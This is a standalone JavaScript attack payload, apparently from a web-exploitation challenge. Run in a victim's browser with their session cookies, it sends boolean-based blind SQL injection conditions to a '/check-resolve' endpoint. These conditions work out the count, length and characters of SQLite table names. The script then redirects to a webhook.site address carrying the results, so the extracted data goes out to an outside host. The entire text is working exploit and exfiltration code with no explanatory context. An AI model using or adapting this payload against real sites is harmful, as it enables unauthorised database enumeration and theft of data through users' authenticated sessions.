(async()=>{
  try{
    const hook='https://webhook.site/aef63664-4b2b-4a25-a695-c21c1fdd7a89/';
    const tests = [
      ["cnt=1", "(SELECT count(*) FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%')=1"],
      ["cnt=2", "(SELECT count(*) FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%')=2"],
      ["len>5", "length((SELECT group_concat(name,'|') FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%'))>5"],
      ["char2=e", "substr((SELECT group_concat(name,'|') FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%'),2,1)='e'"],
      ["char2=c", "substr((SELECT group_concat(name,'|') FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%'),2,1)='c'"],
      ["char2=p", "substr((SELECT group_concat(name,'|') FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%'),2,1)='p'"],
      ["char2=u", "substr((SELECT group_concat(name,'|') FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%'),2,1)='u'"]
    ];

    const out = [];
    for (const [label, cond] of tests){
      const body = new URLSearchParams();
      body.append('id', `CASE WHEN (${cond}) THEN 6 ELSE 7 END`);
      const r = await fetch('/check-resolve',{
        method:'POST',
        headers:{'Content-Type':'application/x-www-form-urlencoded'},
        body,
        credentials:'include'
      });
      const t = await r.text();
      out.push(label + '=' + (t.includes('Not yet') ? 'TRUE' : 'FALSE'));
    }

    location = hook + '?d=' + encodeURIComponent(out.join(' | '));
  }catch(e){
    location = 'https://webhook.site/aef63664-4b2b-4a25-a695-c21c1fdd7a89/?err=' + encodeURIComponent(e.toString());
  }
})();